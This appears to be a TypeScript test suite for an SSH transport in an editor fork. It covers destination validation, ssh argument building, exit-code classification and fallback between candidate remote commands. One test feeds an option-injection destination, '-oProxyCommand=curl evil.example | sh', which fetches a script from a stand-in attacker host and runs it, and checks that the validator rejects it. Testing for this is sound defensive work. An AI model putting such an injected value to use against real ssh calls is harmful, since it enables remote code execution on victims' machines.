/*---------------------------------------------------------------------------------------------
 *  wisp: not part of Code - OSS. Edit editor/overlay in the wisp repo, not this copy.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import * as cp from 'child_process';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { NullLogger } from '../../../log/common/log.js';
import { IWispdTransportClose } from '../../common/wispdClient.js';
import { IWispdProcessStreams } from '../../node/wispdTransport.js';
import { WispdSshTransport, buildSshArgs, classifySshExit, validateSshDestination } from '../../node/wispdSshTransport.js';

suite('validateSshDestination', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('accepts a plain destination', () => {
		assert.strictEqual(validateSshDestination('mac-mini.local'), undefined);
		assert.strictEqual(validateSshDestination('ryan@mac-mini'), undefined);
	});

	test('rejects an empty destination', () => {
		assert.ok(validateSshDestination(''));
	});

	test('rejects a destination ssh would read as an option', () => {
		assert.ok(validateSshDestination('-oProxyCommand=curl evil.example | sh'));
		assert.ok(validateSshDestination('--help'));
	});

	test('rejects whitespace', () => {
		assert.ok(validateSshDestination('mac mini'));
		assert.ok(validateSshDestination('mac-mini\tlocal'));
	});

	test('rejects a control character', () => {
		assert.ok(validateSshDestination('mac-mini\u0007'));
	});
});

suite('buildSshArgs', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('matches decision record 0007 exactly', () => {
		assert.deepStrictEqual(
			buildSshArgs('mac-mini.local', 'wispd'),
			['-T', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=10', '-o', 'ControlPath=none', '--', 'mac-mini.local', 'wispd', 'attach'],
		);
	});

	test('carries an absolute remote path through unchanged', () => {
		assert.deepStrictEqual(
			buildSshArgs('mac-mini.local', '/opt/homebrew/bin/wispd'),
			['-T', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=10', '-o', 'ControlPath=none', '--', 'mac-mini.local', '/opt/homebrew/bin/wispd', 'attach'],
		);
	});
});

suite('classifySshExit', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('exit 4 means wispd attach ran but could not reach or start wispd', () => {
		assert.strictEqual(classifySshExit(4, null, '').reason, 'unreachable');
	});

	test('exit 127 means the remote shell never found the command', () => {
		assert.strictEqual(classifySshExit(127, null, 'bash: line 1: wispd: command not found').reason, 'wispdNotFound');
	});

	test('exit 255 with a permission-denied stderr is an auth failure', () => {
		assert.strictEqual(classifySshExit(255, null, 'ryan@mac-mini: Permission denied (publickey,password,keyboard-interactive).').reason, 'authFailed');
	});

	test('exit 255 with a host-key stderr is an unknown host key', () => {
		assert.strictEqual(classifySshExit(255, null, 'Host key verification failed.').reason, 'hostKeyUnknown');
	});

	test('exit 255 with a connection-level stderr is no route', () => {
		assert.strictEqual(classifySshExit(255, null, 'ssh: connect to host mac-mini.local port 22: Operation timed out').reason, 'noRoute');
		assert.strictEqual(classifySshExit(255, null, 'ssh: connect to host mac-mini.local port 22: Connection refused').reason, 'noRoute');
	});

	test('exit 255 with unrecognized stderr falls back to exited', () => {
		assert.strictEqual(classifySshExit(255, null, 'something ssh never says').reason, 'exited');
	});

	test('any other exit code is exited', () => {
		assert.strictEqual(classifySshExit(1, null, '').reason, 'exited');
	});
});

suite('WispdSshTransport', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	/** Spawns real node processes; each candidate's remote command picks its own script. */
	function run(destination: string, candidates: readonly string[], scriptFor: (remoteCommand: string) => string): { transport: WispdSshTransport; lines: string[]; close: Promise<IWispdTransportClose>; spawned: string[] } {
		const spawned: string[] = [];
		const spawn = (args: readonly string[]) => {
			const remoteCommand = args[args.length - 2];
			spawned.push(remoteCommand);
			return cp.spawn(process.execPath, ['-e', scriptFor(remoteCommand)], { stdio: ['pipe', 'pipe', 'pipe'] }) as cp.ChildProcess & IWispdProcessStreams;
		};
		const transport = store.add(new WispdSshTransport(destination, candidates, spawn, 'ssh -- host wispd attach', new NullLogger(), 1024));
		const lines: string[] = [];
		store.add(transport.onDidReceiveLine(line => lines.push(line)));
		const close = new Promise<IWispdTransportClose>(resolve => store.add(transport.onDidClose(resolve)));
		return { transport, lines, close, spawned };
	}

	const notFoundScript = (remoteCommand: string) => `process.stderr.write('bash: line 1: ${remoteCommand}: command not found\\n'); process.exitCode = 127;`;
	// Answers only once it has read a whole line, so a candidate that never reads stdin (because
	// it exited before anything was replayed to it) would leave the test waiting, not passing by accident.
	const echoScript = `let buf = ''; process.stdin.setEncoding('utf8'); process.stdin.on('data', d => { buf += d; if (buf.includes('\\n')) { process.stdout.write('{"ok":1}\\n'); } });`;

	test('uses the first candidate when it works', async () => {
		const { transport, close, lines, spawned } = run('mac-mini', ['wispd'], () => echoScript);
		transport.send('{"method":"initialize"}');
		await new Promise(resolve => setTimeout(resolve, 200));
		assert.deepStrictEqual(spawned, ['wispd']);
		assert.deepStrictEqual(lines, ['{"ok":1}']);
		void close; // still open; nothing closed it
	});

	test('falls back to the next candidate on exit 127, replaying what was already sent', async () => {
		const candidates = ['wispd', '/opt/homebrew/bin/wispd', '/usr/local/bin/wispd'];
		const { transport, lines, spawned } = run('mac-mini', candidates, remote => remote === '/opt/homebrew/bin/wispd' ? echoScript : notFoundScript(remote));
		// Sent to the first candidate, which exits before ever reading it (decision record 0007's
		// handshake is exactly this shape: WispdClient sends `initialize` once, up front).
		transport.send('{"method":"initialize"}');
		await new Promise(resolve => setTimeout(resolve, 300));
		assert.deepStrictEqual(spawned, ['wispd', '/opt/homebrew/bin/wispd']);
		assert.deepStrictEqual(lines, ['{"ok":1}']);
	});

	test('reports wispdNotFound once every candidate is exhausted', async () => {
		const candidates = ['wispd', '/opt/homebrew/bin/wispd'];
		const { close, spawned } = run('mac-mini', candidates, remote => notFoundScript(remote));
		const result = await close;
		assert.deepStrictEqual(spawned, candidates);
		assert.strictEqual(result.reason, 'wispdNotFound');
		assert.strictEqual(result.exitCode, 127);
	});

	test('does not try another candidate for a non-127 failure', async () => {
		const candidates = ['wispd', '/opt/homebrew/bin/wispd'];
		const authFailScript = `process.stderr.write('Permission denied (publickey).\\n'); process.exitCode = 255;`;
		const { close, spawned } = run('mac-mini', candidates, () => authFailScript);
		const result = await close;
		assert.deepStrictEqual(spawned, ['wispd']);
		assert.strictEqual(result.reason, 'authFailed');
	});
});
